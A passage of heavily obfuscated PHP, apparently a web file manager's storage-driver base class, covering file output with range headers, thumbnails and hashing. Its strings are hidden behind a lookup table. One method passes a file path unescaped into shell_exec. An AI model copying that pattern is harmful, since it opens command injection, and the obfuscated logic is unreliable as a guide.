$E¯ªğÒ¬Ó = '') { goto C êÒÃ‚–; F¥¼©µ¤®‹: $a«ÍÒ¡à±² = $AÈ³Ò ¾¢¾ . $aÎ¨µğŸ¤¿; @touch($a«ÍÒ¡à±²); if ($E¯ªğÒ¬Ó) { file_put_contents($a«ÍÒ¡à±², $E¯ªğÒ¬Ó); } goto eÓÖ¥¿êè“; C êÒÃ‚–: if (!$aÎ¨µğŸ¤¿) { $aÎ¨µğŸ¤¿ = rand_string(15); } $AÈ³Ò ¾¢¾ = TEMP_FILES . rand_string(15) . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][8]; @mkdir($AÈ³Ò ¾¢¾, 511, !0); goto F¥¼©µ¤®‹; eÓÖ¥¿êè“: return $a«ÍÒ¡à±²; goto cŒÌÆõø’á; cŒÌÆõø’á: } public function tempFileRemve($AÍÈ¯á¾ˆÁ) { @unlink($AÍÈ¯á¾ˆÁ); @rmdir($this->pathFather($AÍÈ¯á¾ˆÁ)); } public function mkfile($F Ñª¾°’, $C òåÃßÜ = '', $a×šóîÏÙî = REPEAT_RENAME) { } public function mkdir($b®İæ…ñ‰, $eÊ–ÄğÂòÁ = REPEAT_SKIP) { } public function delFile($aÕÖóäÊ‚) { } public function delFolder($F‚¼äÆ³Ü‡) { } public function copyFile($EÖ¿½¨õ¿â, $e‡Ùš©—·) { } public function moveFile($BŠâÖÑ¥…, $e–ÏãÍØ) { } public function remove($D›çò¼Ìµ) { if ($this->isFile($D›çò¼Ìµ)) { return $this->delFile($D›çò¼Ìµ); } return $this->delFolder($D›çò¼Ìµ); } public function rename($dÁ±¼’±µÅ, $cøƒìæºù–) { } public function exist($fø¿È¯ç¨ù) { } public function findByHash($e†Èùøó = '', $F¼‹…¥äÕæ = '') { return !1; } public function isFile($d¹Ò¨Ñ®ˆà) { } public function isFolder($bÀ×ô­ô…æ) { } public function size($F¿À’á†ø) { } public function info($dÇ×Å²ÅÏç) { } public function infoSimple($c¢¤µµÒ°ã) { return $this->info($c¢¤µµÒ°ã); } public function infoAuth($BÃĞ¿™ËµŸ) { return $this->info($BÃĞ¿™ËµŸ); } public function infoFull($BÛ¼ó¹ìà) { return $this->info($BÛ¼ó¹ìà); } public function infoWithChildren($EéóÕìíì¥) { $A¸Ç –…Ù„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $B¸áÏ“• = array(); if (isset($B¸áÏ“•[$EéóÕìíì¥])) { return $B¸áÏ“•[$EéóÕìíì¥]; } $EÙí³¤Ë = $this->info($EéóÕìíì¥); if ($EÙí³¤Ë && $EÙí³¤Ë[$A¸Ç –…Ù„[29]] == $A¸Ç –…Ù„[76]) { $F‘´ß†êŸ = array($A¸Ç –…Ù„[77] => 0, $A¸Ç –…Ù„[78] => 0, $A¸Ç –…Ù„[79] => 0); $this->infoChildren($EéóÕìíì¥, $F‘´ß†êŸ); $EÙí³¤Ë[$A¸Ç –…Ù„[77]] = $F‘´ß†êŸ[$A¸Ç –…Ù„[77]]; $EÙí³¤Ë[$A¸Ç –…Ù„[80]] = array($A¸Ç –…Ù„[81] => $F‘´ß†êŸ[$A¸Ç –…Ù„[78]], $A¸Ç –…Ù„[82] => $F‘´ß†êŸ[$A¸Ç –…Ù„[79]]); $B¸áÏ“•[$EéóÕìíì¥] = $EÙí³¤Ë; } return $EÙí³¤Ë; } public function listPath($CÑŞ¹ÖÎîí, $féŸÎã®Ğ = false) { } public function has($A÷º±Ö™œ, $A—äê·•Ë = false, $CœèÕšÇó = false) { } public function canRead($cã•¸ƒóæ‡) { } public function canWrite($b¹İ’Ğå¼) { } public function getContent($FÅï˜åí‹) { } public function setContent($B×½òæÌÜŠ, $c å¡‹Œ¿© = '') { } protected function infoChildren($dË³°Èùé§, &$bó°¨é²Ó‰) { $c¯ÒŞê¿¿’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; check_abort(); $dë¬³çµ˜Û = $this->listPath($dË³°Èùé§, !0); $dë¬³çµ˜Û = array_merge($dë¬³çµ˜Û[$c¯ÒŞê¿¿’[74]], $dë¬³çµ˜Û[$c¯ÒŞê¿¿’[73]]); foreach ($dë¬³çµ˜Û as $EÅ´¢«³Õ) { if ($EÅ´¢«³Õ[$c¯ÒŞê¿¿’[29]] == $c¯ÒŞê¿¿’[76]) { $bó°¨é²Ó‰[$c¯ÒŞê¿¿’[79]]++; $CšË˜äµ• = $this->getPathInner($EÅ´¢«³Õ[$c¯ÒŞê¿¿’[75]]); $this->infoChildren($CšË˜äµ•, $bó°¨é²Ó‰); } else { $bó°¨é²Ó‰[$c¯ÒŞê¿¿’[78]]++; $bó°¨é²Ó‰[$c¯ÒŞê¿¿’[77]] += $EÅ´¢«³Õ[$c¯ÒŞê¿¿’[77]]; } } } public function fileSubstr($aÎØˆ„åÏ‚, $cã—›‘÷æ¸, $aĞ¶¾±ÔÌÚ) { } public function listAll($aã¿©åÖŠî) { } public function upload($a¢‹â–ÒÈ–, $DõáÇöö’î, $eô™¾“‘í÷ = false, $eÛ‘Ù¶¿ Â = REPEAT_REPLACE) { } public function uploadFileByID($cÚµ¶Ä³£, $F¶ùëØåé¤, $fİšáôÈğ¶) { } public function uploadFileByPath($cÍ¡·ó›š…, $Fùö±Ä¨¨¼, $føö±¬Îèë = array()) { } public function isUploadServer() { $eµ®ÖÛ©‡‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $eµ®ÖÛ©‡‹[83]) { return !0; } return $GLOBALS[$eµ®ÖÛ©‡‹[6]][$eµ®ÖÛ©‡‹[84]][$eµ®ÖÛ©‡‹[85]]; } public function isFileOutServer() { $Cåôîõ·ê› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Cåôîõ·ê›[83]) { return !0; } return $GLOBALS[$Cåôîõ·ê›[6]][$Cåôîõ·ê›[84]][$Cåôîõ·ê›[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($C…³ÖªØÌØ) { $CÑç½ŞÓÔ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->isCdnHost()) { return $C…³ÖªØÌØ; } return str_replace(trim(get_url_root($C…³ÖªØÌØ), $CÑç½ŞÓÔ[8]), trim($this->cdnHost, $CÑç½ŞÓÔ[8]), $C…³ÖªØÌØ); } public function uploadLink($d“˜¿Ä£Ë¦, $FĞ‡ç­Şîœ = 0) { goto CêÛĞòæ®; cÒˆÖ£í­„: if (!in_array($cÛù¤êŒá®, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $CÎì‰ôó·• = 1024 * 1024 * 10; goto eã†Æ©¡°‡; CêÛĞòæ®: $F¸Æ©ë¹øã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->isUploadServer()) { return; } $cÛù¤êŒá® = $this->getType(); goto cÒˆÖ£í­„; eã†Æ©¡°‡: $aÙŠ§’“¤¤ = $FĞ‡ç­Şîœ <= $CÎì‰ôó·• ? $F¸Æ©ë¹øã[87] : $F¸Æ©ë¹øã[88]; $fğ®á£§ä« = (!$FĞ‡ç­Şîœ ? 1 : ceil($FĞ‡ç­Şîœ / pow(1024, 3))) * 3600 * 4; $FîˆÁ…‹ö£ = $this->{$aÙŠ§’“¤¤}($d“˜¿Ä£Ë¦, $fğ®á£§ä«); goto D°ÔìÁ…Ë; D°ÔìÁ…Ë: if ($FîˆÁ…‹ö£) { $FîˆÁ…‹ö£[$F¸Æ©ë¹øã[89]] = $d“˜¿Ä£Ë¦; $FîˆÁ…‹ö£[$F¸Æ©ë¹øã[90]] = $cÛù¤êŒá®; } return $FîˆÁ…‹ö£; goto cÄñùÚìÇ‹; cÄñùÚìÇ‹: } public function uploadFormData($fé…Œ±Õ§, $aÚ‘èïï = 3600) { } public function multiUploadFormData($aóğÒ¹ÏëÎ, $cÈ˜§±¯³† = 3600) { } public function download($a‚†òÔ—™, $aÆ·ÒÍ–™‡) { } public function ext($fùšñ‘Í‘) { $F¸ŸêÉç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (strpos($fùšñ‘Í‘, $F¸ŸêÉç[8]) === -1) { $dÁÛœ¡ì†¶ = $fùšñ‘Í‘; } else { $dÁÛœ¡ì†¶ = $this->pathThis($fùšñ‘Í‘); } $b‰ØÎ¡‘¡ = $F¸ŸêÉç[33]; if (strstr($dÁÛœ¡ì†¶, $F¸ŸêÉç[91])) { $b‰ØÎ¡‘¡ = substr($dÁÛœ¡ì†¶, strrpos($dÁÛœ¡ì†¶, $F¸ŸêÉç[91]) + 1); $b‰ØÎ¡‘¡ = strtolower($b‰ØÎ¡‘¡); } if (strlen($b‰ØÎ¡‘¡) > 3 && preg_match($F¸ŸêÉç[92], $b‰ØÎ¡‘¡, $A©Òë¡ïé±)) { $b‰ØÎ¡‘¡ = $F¸ŸêÉç[33]; } return $b‰ØÎ¡‘¡; } public function pathThis($cš¼ğÈØÄÊ) { $FàÜ‹–³¡Š =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cš¼ğÈØÄÊ = str_replace($FàÜ‹–³¡Š[93], $FàÜ‹–³¡Š[8], rtrim($cš¼ğÈØÄÊ, $FàÜ‹–³¡Š[8])); $DäìÜùŒÀˆ = strrpos($cš¼ğÈØÄÊ, $FàÜ‹–³¡Š[8]); if ($DäìÜùŒÀˆ === !1) { return $cš¼ğÈØÄÊ; } return substr($cš¼ğÈØÄÊ, $DäìÜùŒÀˆ + 1); } public function pathFather($F‘‡„Òœ„) { $Eš×Ûù«Ÿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F‘‡„Òœ„ = str_replace($Eš×Ûù«Ÿ[93], $Eš×Ûù«Ÿ[8], rtrim($F‘‡„Òœ„, $Eš×Ûù«Ÿ[8])); $Aã“ÀÔö‡  = strrpos($F‘‡„Òœ„, $Eš×Ûù«Ÿ[8]); if ($Aã“ÀÔö‡  === !1) { return $Eš×Ûù«Ÿ[33]; } return substr($F‘‡„Òœ„, 0, $Aã“ÀÔö‡  + 1); } public function hashSimple($C›äæĞ‡Ûì) { goto Có¦¬ÎŒ±; a· «ôÄ±‘: $cÛìÃ•³ù· = 200; $e°…“ ²¯ = 50; if ($càŸ±Òò´Ë <= $cÛìÃ•³ù· * $e°…“ ²¯) { return $this->hashMd5($C›äæĞ‡Ûì) . $càŸ±Òò´Ë; } goto D„ƒ­¢§¶Ş; Có¦¬ÎŒ±: $EÈËÑ¤§¿Ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$C›äæĞ‡Ûì) { return md5($EÈËÑ¤§¿Ì[33]); } $càŸ±Òò´Ë = $this->size($C›äæĞ‡Ûì); goto a· «ôÄ±‘; D„ƒ­¢§¶Ş: $cÍ¯ªëÏì† = intval($càŸ±Òò´Ë / $e°…“ ²¯); $f‰Áæ·…çŒ = $EÈËÑ¤§¿Ì[33]; for ($A²œåóãù = 0; $A²œåóãù < $e°…“ ²¯; $A²œåóãù++) { $f‰Áæ·…çŒ .= $this->fileSubstr($C›äæĞ‡Ûì, $cÍ¯ªëÏì† * $A²œåóãù, $cÛìÃ•³ù·); } goto D‡ƒºÒŠÌ; D‡ƒºÒŠÌ: $f‰Áæ·…çŒ .= $this->fileSubstr($C›äæĞ‡Ûì, $càŸ±Òò´Ë - $cÛìÃ•³ù·, $cÛìÃ•³ù·); return md5($f‰Áæ·…çŒ) . $càŸ±Òò´Ë; goto F™‚…í¼ºÀ; F™‚…í¼ºÀ: } public static $md5Cache = array(); public function hashMd5($c‘Ûïî·¨) { $c‘Ûïî·¨ = $this->iconvSystem($c‘Ûïî·¨); if (isset(self::$md5Cache[$c‘Ûïî·¨])) { return self::$md5Cache[$c‘Ûïî·¨]; } self::$md5Cache[$c‘Ûïî·¨] = $this->hashMd5Shell($c‘Ûïî·¨); if (!self::$md5Cache[$c‘Ûïî·¨]) { self::$md5Cache[$c‘Ûïî·¨] = @md5_file($c‘Ûïî·¨); } return self::$md5Cache[$c‘Ûïî·¨]; } private function hashMd5Shell($cã‹ÚîÖ’ ) { goto eÌ‰¯ÈºÄ¸; eÌ‰¯ÈºÄ¸: $cíèæáÖÌ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!function_exists($cíèæáÖÌ[94])) { return !1; } $Bã²Ÿ¸Û = array($cíèæáÖÌ[95], $cíèæáÖÌ[96]); goto c£Ë“¨Ò¥; aˆë¡‰¬×³: $AÔ¢²ÑÚõ = shell_exec($fÈÕ»ÛóÍì . "\x20\x22{$cã‹ÚîÖ’ }\x22"); $AÔ¢²ÑÚõ = str_replace($cíèæáÖÌ[100], $cíèæáÖÌ[33], $AÔ¢²ÑÚõ); return substr($AÔ¢²ÑÚõ, 0, 32); goto f–½ƒÉäò‚; c£Ë“¨Ò¥: $fÈÕ»ÛóÍì = Cache::get($cíèæáÖÌ[97]); if (!$fÈÕ»ÛóÍì) { $aÙÀğƒŒ = BASIC_PATH . $cíèæáÖÌ[98]; $F…®ßŸä¿ = md5_file($aÙÀğƒŒ); $fÈÕ»ÛóÍì = $cíèæáÖÌ[99]; foreach ($Bã²Ÿ¸Û as $e²éÑÅĞ•×) { $AÔ¢²ÑÚõ = shell_exec($e²éÑÅĞ•× . "\x20\x22{$aÙÀğƒŒ}\42"); if ($AÔ¢²ÑÚõ && substr(trim($AÔ¢²ÑÚõ), 0, 32) == $F…®ßŸä¿) { $fÈÕ»ÛóÍì = $e²éÑÅĞ•×; break; } } Cache::set($cíèæáÖÌ[97], $fÈÕ»ÛóÍì, 3600); } if ($fÈÕ»ÛóÍì == $cíèæáÖÌ[99]) { return !1; } goto aˆë¡‰¬×³; f–½ƒÉäò‚: } public function link($C¹†…¤ßÒ‡) { return $C¹†…¤ßÒ‡; } public function fileOut($Cì¾õ²òôŠ, $bÍ¡–ÂÇ¾ = false, $fµìèİ¤Ÿ = false, $eÅ é”õÓ = '') { goto bó—Ê¹®Şç; eĞîù¥ë¾: if ($C©Ğß¨„¶Ä) { $báôÁ³£‹› = intval(1000 * 1000 * ($DÏšœºôô½ / $C©Ğß¨„¶Ä)); } while ($F¾Á›‡‡Õ– <= $bˆ¼‰¤Ñíš) { $DÜöÃŞ²„¹ = timeFloat(); check_abort(); $Bè‘¬ÊİîÜ = $bˆ¼‰¤Ñíš - $F¾Á›‡‡Õ– + 1; if ($Bè‘¬ÊİîÜ <= $DÏšœºôô½) { $DÏšœºôô½ = $Bè‘¬ÊİîÜ; } echo $this->fileSubstr($Cì¾õ²òôŠ, $F¾Á›‡‡Õ–, $DÏšœºôô½); $F¾Á›‡‡Õ– += $DÏšœºôô½; if ($DÏšœºôô½ == $Bè‘¬ÊİîÜ) { $F¾Á›‡‡Õ– = $bˆ¼‰¤Ñíš + 1; } if ($báôÁ³£‹›) { $F¸…ÄØÆÕ = intval(1000 * 1000 * (timeFloat() - $DÜöÃŞ²„¹)); $bã´±¿˜£‘ = $báôÁ³£‹› - $F¸…ÄØÆÕ; if ($bã´±¿˜£‘ > 5) { usleep($bã´±¿˜£‘); } } } goto cÕ·°–İÜî; eÅĞÅ˜ôóå: header($Aæ¨Ôİå×[132] . $FÆ­øˆ½‚Ü . $Aæ¨Ôİå×[124]); header($Aæ¨Ôİå×[133] . $dÁ½Ú¶); header($Aæ¨Ôİå×[134]); goto DÏšÁÕ”™; eğ‰äÓôø±: header($Aæ¨Ôİå×[121]); header($Aæ¨Ôİå×[122] . $b™Â¡×ğ–); header($Aæ¨Ôİå×[123] . gmdate($Aæ¨Ôİå×[106], time() + 3600 * 24 * 30) . $Aæ¨Ôİå×[124]); goto CŞÃÁîİ; DÏšÁÕ”™: header($Aæ¨Ôİå×[135] . $fÅÂ¥ºÏ¦); header($Aæ¨Ôİå×[136]); if (!$bÍ¡–ÂÇ¾ && $dê’ó®Çï == $Aæ¨Ôİå×[137]) { if ($fÅÂ¥ºÏ¦ > 1024 * 1024 * 5) { die; } $d‹‹³ª¥Ÿƒ = $this->getContent($Cì¾õ²òôŠ); $d‹‹³ª¥Ÿƒ = Html::clearSVG($d‹‹³ª¥Ÿƒ); header($Aæ¨Ôİå×[138] . $fÅÂ¥ºÏ¦); echo $d‹‹³ª¥Ÿƒ; die; } goto aù‡ŒÚ…ê£; CŞÃÁîİ: header($Aæ¨Ôİå×[125]); header($Aæ¨Ôİå×[126]); header($Aæ¨Ôİå×[127]); goto a½ÖÊíóö; f²ƒÍÖ‡í‘: $B’†”§–İš = !0; if ($_SERVER[$Aæ¨Ôİå×[151]] == $Aæ¨Ôİå×[152] && $fÅÂ¥ºÏ¦ > 1204 * 1024 * 1024 * 2) { $B’†”§–İš = !1; } if ($B’†”§–İš) { header($Aæ¨Ôİå×[153] . ($bˆ¼‰¤Ñíš - $F¾Á›‡‡Õ– + 1)); } goto e…Ûµö†‚‹; dÀ´¢¥Ô: $fÅÂ¥ºÏ¦ = $f›Âİ¬Ğá[$Aæ¨Ôİå×[77]]; $FÆ­øˆ½‚Ü = gmdate($Aæ¨Ôİå×[106], $f›Âİ¬Ğá[$Aæ¨Ôİå×[107]]); $dÁ½Ú¶ = $fµìèİ¤Ÿ ? $fµìèİ¤Ÿ : $this->iconvApp($f›Âİ¬Ğá[$Aæ¨Ôİå×[28]]); goto EØ°Æ¢â³Ş; FÓáÍÊĞ§×: $cŠ‚Õ¹œ«Í = $this->getType() == $Aæ¨Ôİå×[102]; $CÏñÚš˜‚ = $GLOBALS[$Aæ¨Ôİå×[6]][$Aæ¨Ôİå×[84]][$Aæ¨Ôİå×[103]][$Aæ¨Ôİå×[104]]; $C©Ğß¨„¶Ä = (double) $GLOBALS[$Aæ¨Ôİå×[6]][$Aæ¨Ôİå×[84]][$Aæ¨Ôİå×[103]][$Aæ¨Ôİå×[105]] * 1024 * 1024; goto F¦ÛĞ©áâ‘; d—Ü‘¨‰˜: $b™Â¡×ğ– = get_file_mime($dê’ó®Çï); if (strstr($b™Â¡×ğ–, $Aæ¨Ôİå×[114])) { $b™Â¡×ğ– = $b™Â¡×ğ– . $Aæ¨Ôİå×[115]; } if ($bÍ¡–ÂÇ¾ === !1 && !mime_support($b™Â¡×ğ–)) { $bÍ¡–ÂÇ¾ = !0; $b™Â¡×ğ– = $Aæ¨Ôİå×[116]; } goto Eô ŒËµÄß; a½ÖÊíóö: if (isset($_SERVER[$Aæ¨Ôİå×[128]]) && strtotime($_SERVER[$Aæ¨Ôİå×[128]]) == $f›Âİ¬Ğá[$Aæ¨Ôİå×[107]]) { header($Aæ¨Ôİå×[129], !0, 304); die; } if (isset($_SERVER[$Aæ¨Ôİå×[130]]) && $_SERVER[$Aæ¨Ôİå×[130]] == $eÅ é”õÓ) { header($Aæ¨Ôİå×[131] . $eÅ é”õÓ, !0, 304); die; } header($Aæ¨Ôİå×[131] . $eÅ é”õÓ); goto eÅĞÅ˜ôóå; bó—Ê¹®Şç: $Aæ¨Ôİå× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->cacheMethod(null, null); if (!$Cì¾õ²òôŠ || !$this->exist($Cì¾õ²òôŠ)) { show_json(LNG($Aæ¨Ôİå×[101]), !1, $fµìèİ¤Ÿ); } goto FÓáÍÊĞ§×; F¦ÛĞ©áâ‘: @ob_end_clean(); set_timeout(); $f›Âİ¬Ğá = $this->infoFull($Cì¾õ²òôŠ); goto dÀ´¢¥Ô; Eô ŒËµÄß: $eÀì³®î‰ö = rawurlencode($dÁ½Ú¶); $eÀì³®î‰ö = $Aæ¨Ôİå×[113] . $eÀì³®î‰ö . $Aæ¨Ôİå×[117] . $eÀì³®î‰ö; if ($bÍ¡–ÂÇ¾) { header($Aæ¨Ôİå×[118]); header($Aæ¨Ôİå×[119] . $eÀì³®î‰ö); } else { header($Aæ¨Ôİå×[120] . $eÀì³®î‰ö); } goto eğ‰äÓôø±; e¶²­•Û£†: if (in_array($dê’ó®Çï, array($Aæ¨Ôİå×[108], $Aæ¨Ôİå×[109], $Aæ¨Ôİå×[110], $Aæ¨Ôİå×[111]))) { $dê’ó®Çï = $Aæ¨Ôİå×[112]; } if (!$eÅ é”õÓ) { $eÅ é”õÓ = md5($FÆ­øˆ½‚Ü . $this->hashSimple($Cì¾õ²òôŠ)); } $eÅ é”õÓ = $Aæ¨Ôİå×[113] . $eÅ é”õÓ . $Aæ¨Ôİå×[113]; goto d—Ü‘¨‰˜; aù‡ŒÚ…ê£: $Aš“â«‡µ¾ = strtolower($_SERVER[$Aæ¨Ôİå×[139]]); if ($cŠ‚Õ¹œ«Í && $Aš“â«‡µ¾ && $CÏñÚš˜‚) { if (strstr($Aš“â«‡µ¾, $Aæ¨Ôİå×[140])) { header($Aæ¨Ôİå×[141] . $Cì¾õ²òôŠ); } else { if (strstr($Aš“â«‡µ¾, $Aæ¨Ôİå×[142])) { header($Aæ¨Ôİå×[143] . $Cì¾õ²òôŠ); } else { if (strstr($Aš“â«‡µ¾, $Aæ¨Ôİå×[144])) { header($Aæ¨Ôİå×[145] . $Cì¾õ²òôŠ); } } } if ($C©Ğß¨„¶Ä) { header($Aæ¨Ôİå×[146] . $C©Ğß¨„¶Ä); } return; } if (isset($_SERVER[$Aæ¨Ôİå×[147]])) { if (preg_match($Aæ¨Ôİå×[148], $_SERVER[$Aæ¨Ôİå×[147]], $DŒäªì‹‡)) { $F¾Á›‡‡Õ– = intval($DŒäªì‹‡[1]); if (!empty($DŒäªì‹‡[2])) { $bˆ¼‰¤Ñíš = intval($DŒäªì‹‡[2]); } } header($Aæ¨Ôİå×[149]); header("\103\157\156\164\145\156\x74\55\x52\x61\x6e\147\x65\72\x20\142\x79\164\x65\x73\40{$F¾Á›‡‡Õ–}\x2d{$bˆ¼‰¤Ñíš}\x2f" . $fÅÂ¥ºÏ¦); } else { header($Aæ¨Ôİå×[150]); } goto f²ƒÍÖ‡í‘; e…Ûµö†‚‹: if ($_SERVER[$Aæ¨Ôİå×[154]] == $Aæ¨Ôİå×[155]) { return; } $DÏšœºôô½ = 1024 * 100; $báôÁ³£‹› = 0; goto eĞîù¥ë¾; EØ°Æ¢â³Ş: $F¾Á›‡‡Õ– = 0; $bˆ¼‰¤Ñíš = $fÅÂ¥ºÏ¦ - 1; $dê’ó®Çï = $this->ext($dÁ½Ú¶); goto e¶²­•Û£†; cÕ·°–İÜî: } public function fileOutServer($e¼Ì‹®Ø³µ, $d¯º¢‡†© = false, $eã×ˆÃ¥¤ = false, $cÜ¯ÔÀâœÀ = '') { $this->fileOut($e¼Ì‹®Ø³µ, $d¯º¢‡†©, $eã×ˆÃ¥¤, $cÜ¯ÔÀâœÀ); } public function fileOutLink($d’Ø¡Š° ¼) { header($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][156] . $d’Ø¡Š° ¼); die; } public function cacheMethod($A´‹õƒ†Ó×, $D®–”ÙÂ½İ) { goto FÜ®Ç–Œ¯; FÏŞÚÚ ‡¤: $Aâèİ×ÖÑ[$AÖ©ˆ‰ãÉ] = $a¬ìâ…çò‘; return $a¬ìâ…çò‘; goto f“ã®Ú„†; a¦Ç¾Ñ†Ú†: $AÖ©ˆ‰ãÉ = $câ¡Õİ¬¤ë[157] . $A´‹õƒ†Ó× . $câ¡Õİ¬¤ë[158] . rtrim($DÕ£¤šÏšÉ, $câ¡Õİ¬¤ë[8]); if (is_null($A´‹õƒ†Ó×)) { $Aâèİ×ÖÑ = array(); return; } if (is_null($D®–”ÙÂ½İ)) { unset($Aâèİ×ÖÑ[$AÖ©ˆ‰ãÉ]); return; } goto EÜË‡âŠÍó; FÜ®Ç–Œ¯: $câ¡Õİ¬¤ë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $Aâèİ×ÖÑ = array(); $DÕ£¤šÏšÉ = $D®–”ÙÂ½İ ? ltrim($this->getPathOuter($D®–”ÙÂ½İ), $câ¡Õİ¬¤ë[8]) : $D®–”ÙÂ½İ; goto a¦Ç¾Ñ†Ú†; EÜË‡âŠÍó: $a¬ìâ…çò‘ = isset($Aâèİ×ÖÑ[$AÖ©ˆ‰ãÉ]) ? $Aâèİ×ÖÑ[$AÖ©ˆ‰ãÉ] : null; if (!is_null($a¬ìâ…çò‘)) { return $a¬ìâ…çò‘; } $a¬ìâ…çò‘ = $this->{$A´‹õƒ†Ó×}($D®–”ÙÂ½İ); goto FÏŞÚÚ ‡¤; f“ã®Ú„†: } public function fileOutImage($D“µÃÈñŠ¯, $BÑ£¦ŒÏ¹¯ = 250) { goto CÜ®´¼ºÒ; AŞë¿Ùóœ›: if (!($eá‹×¾—ÚÑ = IO::move($cÕ¹Ëèà­, $BÏ¯áÈÈ„Ø))) { return IO::fileOut($cÕ¹Ëèà­); } del_file($cÕ¹Ëèà­); IO::fileOut($eá‹×¾—ÚÑ); goto E¥‡ìÒó·„; FÛî©¦’÷·: if ($cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[77]] <= 1024 * 50 || !function_exists($aÍ¬Ô½ãŠ[159]) || $cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[160]] == $aÍ¬Ô½ãŠ[161]) { return $this->fileOut($D“µÃÈñŠ¯); } if (isset($cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[162]][$aÍ¬Ô½ãŠ[163]])) { $EÒ Ü‡²åØ = $cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[162]][$aÍ¬Ô½ãŠ[163]]; } else { if (isset($cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[162]][$aÍ¬Ô½ãŠ[164]])) { $EÒ Ü‡²åØ = $cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[162]][$aÍ¬Ô½ãŠ[164]]; } else { $EÒ Ü‡²åØ = md5("{$cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[28]]}\x5f{$cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[75]]}\x5f{$cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[77]]}"); } } $EÈ çëÍ = "{$EÒ Ü‡²åØ}\x5f{$BÑ£¦ŒÏ¹¯}\56\x70\156\147"; goto cš’®¥éÕ©; CÜ®´¼ºÒ: $aÍ¬Ô½ãŠ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (substr($D“µÃÈñŠ¯, 0, 4) == $aÍ¬Ô½ãŠ[144]) { $this->fileOutLink($D“µÃÈñŠ¯); } $cèˆ—ñƒà´ = $this->info($D“µÃÈñŠ¯); goto FÛî©¦’÷·; cš’®¥éÕ©: if (!($A‚ë÷ªšğÀ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $aÍ¬Ô½ãŠ[165]))) { $BÏ¯áÈÈ„Ø = IO::mkdir(IO_PATH_SYSTEM_TEMP . $aÍ¬Ô½ãŠ[166]); } else { $BÏ¯áÈÈ„Ø = KodIO::make($A‚ë÷ªšğÀ); } if ($A‚ë÷ªšğÀ = IO::fileNameExist($BÏ¯áÈÈ„Ø, $EÈ çëÍ)) { $cÕ¹Ëèà­ = KodIO::make($A‚ë÷ªšğÀ); return IO::fileOut($cÕ¹Ëèà­); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Eö£Ùê»Ú; Eö£Ùê»Ú: $cÕ¹Ëèà­ = DATA_THUMB . $EÈ çëÍ; if (!@file_exists($cÕ¹Ëèà­)) { $D°Ò…Š½ô = TEMP_FILES; if (!is_dir($D°Ò…Š½ô)) { mk_dir($D°Ò…Š½ô); } $BõµŞ–ººÅ = $D°Ò…Š½ô . $EÒ Ü‡²åØ . $aÍ¬Ô½ãŠ[91] . $cèˆ—ñƒà´[$aÍ¬Ô½ãŠ[160]]; if (!@file_exists($BõµŞ–ººÅ)) { $BõµŞ–ººÅ = $this->download($D“µÃÈñŠ¯, $BõµŞ–ººÅ); } $fÀòòÈÔà‡ = new ImageThumb($BõµŞ–ººÅ, $aÍ¬Ô½ãŠ[167]); $fÀòòÈÔà‡->prorate($cÕ¹Ëèà­, $BÑ£¦ŒÏ¹¯, $BÑ£¦ŒÏ¹¯ * 10); } if (!file_exists($cÕ¹Ëèà­) || filesize($cÕ¹Ëèà­) < 100) { return @file_exists($BõµŞ–ººÅ) ? IO::fileOut($BõµŞ–ººÅ) : $this->fileOut($D“µÃÈñŠ¯); } goto AŞë¿Ùóœ›; E¥‡ìÒó·„: } public function fileOutImageServer($bÁŒ•ÑŠ‚Ù, $fˆ¶¨¶åÅ˜ = 250) { $this->fileOutImage($bÁŒ•ÑŠ‚Ù, $fˆ¶¨¶åÅ˜); } public function fileNameAuto($cöŞÅØ¸à, $b·Å»ôìÆ‰, $eÛ‘‰«š = REPEAT_RENAME, $aÔñÁŠáÑÚ = false) { goto f„­¸±Ñ ï; aø—¢©‹¶â: while ($this->exist(rtrim($cöŞÅØ¸à, $A¹¨ÎÍöã[8]) . $A¹¨ÎÍöã[8] . $CÄãËÓƒ¶®)) { $CÄãËÓƒ¶® = $Eô¾ƒ¹Ç‡Ğ . "\x28{$Dà†°’•ò}\51{$E†Š†…â•}"; $Dà†°’•ò++; } return $CÄãËÓƒ¶®; goto BØÀ“ºäòÁ; DÌ—‰™“¼Ä: if ($eÛ‘‰«š == REPEAT_SKIP) { return !1; } $E†Š†…â• = $A¹¨ÎÍöã[91] . get_path_ext($b·Å»ôìÆ‰); $E†Š†…â• = $E†Š†…â• == $A¹¨ÎÍöã[91] || $aÔñÁŠáÑÚ ? $A¹¨ÎÍöã[33] : $E†Š†…â•; goto d‰ŸÑ‚×±÷; f„­¸±Ñ ï: $A¹¨ÎÍöã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÁ°´¾òîó = $cöŞÅØ¸à === 